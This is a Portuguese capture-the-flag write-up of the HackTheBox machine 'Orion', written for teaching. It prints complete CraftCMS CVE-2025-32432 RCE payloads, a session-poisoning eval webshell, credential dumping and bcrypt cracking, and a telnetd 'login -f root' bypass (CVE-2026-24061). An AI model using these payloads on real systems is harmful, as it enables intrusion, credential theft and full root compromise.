# Orion

## informações da máquina

| atributo | valor |
|----------|-------|
| **plataforma** | HackTheBox |
| **dificuldade** | Very Easy |
| **OS** | Linux |
| **IP** | 10.129.112.249 |
| **técnicas** | CraftCMS enumeration, CSRF token bypass, CVE-2025-32432 (session poisoning RCE), hash cracking GPU, password reuse, CVE-2026-24061 (telnetd auth bypass) |
| **link HTB** | [https://app.hackthebox.com/machines/Orion](https://app.hackthebox.com/machines/Orion) |

## resumo

a máquina expõe SSH e um site CraftCMS 5.6.16 na porta 80. a versão é vulnerável ao CVE-2025-32432, RCE pré-auth no endpoint `actions/assets/generate-transform`: o JSON passa pelo sistema de object configuration do Yii, que instancia classes arbitrárias. o exploit exige bypass do CSRF e usa envenenamento de arquivo de sessão PHP em vez de reverse shell. como `www-data`, o `.env` do Craft entrega as credenciais root do MariaDB local; a tabela `users` tem o hash bcrypt do admin `adam@orion.htb`, quebrado com hashcat na GPU, e a senha é reutilizada no SSH. na escalação, `ss` como adam revela um telnetd GNU inetutils 2.7 escutando só em `127.0.0.1:23`, vulnerável ao CVE-2026-24061: `USER="-f root"` chega ao `login(1)` como `login -f root` e autentica root sem senha.

## enumeração/scanning

### port scanning

```bash
nmap -sCV -T4 --top-ports 1000 10.129.112.249 -oN scans/orion-top1000
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu) | Orion Telecom
```

um `-p-` completo estourou o timeout de 10 min antes de retornar qualquer resultado. refazer com `--top-ports 1000` fechou a questão em 27 s: só 22 e 80 abertos. para uma Very Easy, gastar 10 minutos em scan lento não abre caminho novo — o alvo é web puro.

### web: CraftCMS e versão exposta

o site é de uma telecom fictícia ("Orion Telecom"). o footer entrega a stack:

```text
Powered by CraftCMS
```

o ffuf confirma o painel administrativo:

```bash
ffuf -u http://orion.htb/FUZZ -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic
  admin    [Status: 302]
  assets   [Status: 301]
```

`/admin` redireciona para `/admin/login`. a página de login mostra a versão no rodapé, um clássico vazamento de informação:

```bash
curl -s http://orion.htb/admin/login | grep -oE 'Craft CMS [0-9.]+'
Craft CMS 5.6.16
```

a versão é a chave do foothold: 5.6.16 < 5.6.17, janela do CVE-2025-32432. a mesma resposta GET já entrega o material do CSRF (cookies `CraftSessionId` e `CRAFT_CSRF_TOKEN`, e o `csrfTokenValue` no HTML), que o próximo passo consome.

## exploitation

### CSRF token bypass

o POST ao endpoint vulnerável passa pela checagem CSRF do Yii. o material vem todo da mesma resposta de `/admin/login`:

```bash
curl -s http://orion.htb/admin/login -c jar.txt -o login.html
grep -oE 'csrfTokenValue":"[^"]+' login.html | sed 's/csrfTokenValue":"//' > csrf.txt
```

- cookie `CraftSessionId`: identidade da sessão
- cookie `CRAFT_CSRF_TOKEN`: referência armazenada no servidor (valor URL-encoded)
- header `X-CSRF-Token`: o valor real, de `csrfTokenValue`

a primeira tentativa montou a string de cookies na mão com `tr`/`sed` e uma barra solta entrou no fim do `CRAFT_CSRF_TOKEN`. o servidor respondeu `400 — Unable to verify your data submission`. trocar para cookie jar nativo do curl (`-c`/`-b`) resolveu: o jar preserva o valor exato que o `Set-Cookie` entregou. um 400 nesse endpoint significa "checagem CSRF rodou e falhou", não "endpoint inexistente" — distinguir os dois evita descartar uma via válida.

### verificando o CVE com phpinfo

o CVE-2025-32432 vive no `actions/assets/generate-transform`. o campo `handle` do JSON passa pelo object configuration do Yii: chaves como `class` e `as session` viram instruções de instanciação. o gadget `GuzzleHttp\Psr7\FnStream` com `_fn_close: phpinfo` chama `phpinfo()` quando o objeto é destruído — RCE como confirmação de segurança antes de payload destrutivo:

```json
{
    "assetId": 11,
    "handle": {
        "width": 123,
        "height": 123,
        "as session": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "GuzzleHttp\\Psr7\\FnStream",
            "__construct()": [[]],
            "_fn_close": "phpinfo"
        }
    }
}
```

```bash
curl -sg -X POST "http://orion.htb/index.php?p=actions/assets/generate-transform" \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: $(cat csrf.txt)" \
  -b jar.txt --data @phpinfo-payload.json
HTTP:200  →  session.save_path = /var/lib/php/sessions
```

o `-g` (`--globoff`) é obrigatório: os colchetes de `$_GET[...]` nos payloads seguintes são sintaxe de glob de URL para o curl, e sem a flag o request nem sai ("bad range specification in URL position 62"). além de confirmar a vulnerabilidade sem efeito destrutivo, o phpinfo entrega o caminho dos arquivos de sessão, que o exploit final consome.

### RCE por envenenamento de sessão

o módulo do Metasploit para esse CVE usa meterpreter. o caminho manual (PHP session poisoning) é mais instructivo e não depende do msfconsole.

**passo 1 — injetar o webshell na sessão.** GET com a query literal, sem cookies, sem URL-encode:

```bash
curl -sg 'http://orion.htb/index.php?p=admin/dashboard&a=<?=eval($_GET['"'"'cmd'"'"']);die()?>
' -D inject-headers.txt
HTTP:302  →  Set-Cookie: CraftSessionId=sbvknddh9tjau7sb02rn6r8gnu
```

o Craft grava a URL atual no `__returnUrl` da sessão recém-criada. o id da sessão da resposta é o arquivo envenenado.

duas tentativas falharam antes da certa, ambas com lição:

1. com `--data-urlencode`, o valor armazenado ficou re-encodado (`%28` no lugar de `(`). o `require` morreu com `ParseError: syntax error, unexpected token "%"`. o stack trace do Yii mostra o conteúdo do arquivo de sessão na saída, o que tornou o diagnóstico imediato: payload re-encodado não é código executável.
2. sem `--globoff`, o curl abortou antes de enviar. nenhuma resposta, nenhum arquivo de header — sintaxe de glob do curl, não problema do alvo.

**passo 2 — trigger com PhpManager.** o gadget `yii\rbac\PhpManager` recebe `itemFile` no construtor e o `init()` faz `require` do arquivo:

```json
{
    "assetId": 11,
    "handle": {
        "width": 123,
        "height": 123,
        "as session": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "yii\\rbac\\PhpManager",
            "__construct()": [
                {"itemFile": "/var/lib/php/sessions/sess_sbvknddh9tjau7sb02rn6r8gnu"}
            ]
        }
    }
}
```

**passo 3 — executar comandos.** o `cmd` viaja na query do mesmo POST; o base64 é URL-encodado porque o PHP converte `+` em espaço na query string e o comando chegava corrompido:

```bash
curl -sg -X POST "http://orion.htb/index.php?p=actions/assets/generate-transform&cmd=system(base64_decode('<b64>'));" \
  -H "Content-Type: application/json" -H "X-CSRF-Token: $(cat csrf.txt)" \
  -b jar.txt --data @rce-payload.json | sed 's/.*&a=//'
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

shell sem reverse shell e sem listener: o output do comando volta inline na resposta HTTP, e o fluxo inteiro roda com curl.

## acesso como adam

### credenciais do banco no .env

ainda como `www-data`, o diretório do Craft está no cwd (`/var/www/html/craft`). o `.env` é padrão de credential disclosure:

```text
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

o MariaDB escuta só em `127.0.0.1:3306`, então a consulta roda no próprio alvo, pelo webshell:

```bash
mysql -u root -p'SuperSecureCraft123Pass!' orion -e 'select id,username,email,password from users;'
id  username  email            password
1   admin     adam@orion.htb   $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

o admin do Craft (`adam@orion.htb`) é o único usuário real do sistema. hash bcrypt (`$2y$13$`), custo 13, sem salt visível porque o bcrypt embute o salt no hash.

### quebrando o hash com GPU

hashcat `-m 3200` (bcrypt). sem runtime OpenCL o hashcat nem inicia ("No OpenCL, HIP or CUDA compatible platform found"), então o setup da GPU (ROCm via dnf) fez parte do lab. wordlist local (SecLists, `darkweb2017_top-10000.txt`, 10 mil candidatos):

```bash
hashcat -m 3200 hash.txt ~/SecLists/Passwords/Common-Credentials/darkweb2017_top-10000.txt
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```

56 segundos de GPU para a lista inteira. em CPU (~200 H/s) seriam ~50 s só para os primeiros 10 mil; em uma lista estilo rockyou (14 M), a GPU cumpre em minutos o que CPU levaria horas.

### password reuse para SSH

`darkangel` testado no SSH — a senha do admin do CMS é candidata natural de reuso:

```bash
sshpass -p 'darkangel' ssh adam@orion.htb 'id; cat user.txt'
uid=1000(adam) gid=1000(adam) groups=1000(adam)
```

**user flag:** ✓

o webshell como `www-data` recebeu `Permission denied` em `/home/adam/`, então o SSH não era opcional: shells de www-data servem para credenciais; a flag do usuário fica atrás da home dele.

## privilege escalation

### porta interna e telnetd antigo

recon de rede como adam, sem `sudo`:

```bash
ss -tulnp
tcp LISTEN 0 10 127.0.0.1:23   0.0.0.0:*   ← telnet, invisível externamente
tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:*

telnet --version
telnet (GNU inetutils) 2.7
```

o nmap externo não vê a porta 23 (bind local). sem um foothold de usuário, esse serviço não existe para o atacante. GNU inetutils 2.7 é a janela do CVE-2026-24061.

### CVE-2026-24061: login -f root

o `telnetd` passa a variável `USER` direto para o `login(1)`. `USER="-f root"` vira o comando `login -f root`, e o `-f` pula a autenticação:

```bash
USER="-f root" telnet -a 127.0.0.1
```

via SSH não-interativo, o stdin pipeado com `sleep` dá tempo para a negociação do telnet terminar antes do comando:

```bash
(sleep 4; echo "id; hostname; cat /root/root.txt"; sleep 3; echo exit) | \
  USER="-f root" telnet -a 127.0.0.1
uid=0(root) gid=0(root) groups=0(root)
orion
```

**root flag:** ✓

nenhum segredo quebrado, nenhuma chave roubada: o daemon confiou em uma variável de ambiente controlada pelo cliente. serviços legados escutando em localhost são pontos de escalação invisíveis para o recon externo, e "legado" aqui significou uma checagem de autenticação inteira removida.

## lições aprendidas

- payload precisa chegar **literal** ao servidor quando vai virar código: `--data-urlencode` corrompeu a injeção (`%28` em vez de `(`) e só o ParseError do require revelou o problema.
- quatro falhas de ferramenta em sequência (cookie com `/` extra, `--data-urlencode`, glob de URL do curl, `+` do base64 virando espaço) atrasaram mais que qualquer dificuldade do alvo. ler o erro do lado do servidor antes de trocar de abordagem economiza cada uma delas.
- o phpinfo como prova de vulnerabilidade não é cerimônia: entregou o `session.save_path` que o exploit final precisava.
- verificar RCE com um gadget inofensivo (FnStream/phpinfo) antes de escalar para execução delimita o problema: se o phpinfo passa e o PhpManager falha, a defeita está no gadget, não no bypass de CSRF.
- `session.save_path` + arquivo de sessão nomeado = inclusão de arquivo controlada pelo atacante. a mesma primitiva que LFI explora, com o conteúdo escolhido por nós.
- hash bcrypt custo 13 em CPU é viável mas doloroso; com GPU e runtime OpenCL configurado, listas de 10 mil levam menos de um minuto.
- senha do admin de aplicação reutilizada no SSH é o padrão mais comum das Easy do HTB.
- `ss -tulnp` como usuário comum mostra serviços bindados em `127.0.0.1` que nenhum scan externo revela. recon interno de portas é passo padrão pós-foothold.
- cote payload contra o módulo original antes de culpar o alvo: o writeup oficial trazia `raft\behaviors\FieldLayoutBehavior` no payload de trigger (um `c` perdido na extração do PDF); o correto é `craft\behaviors\FieldLayoutBehavior`.

---

*writeup by kp*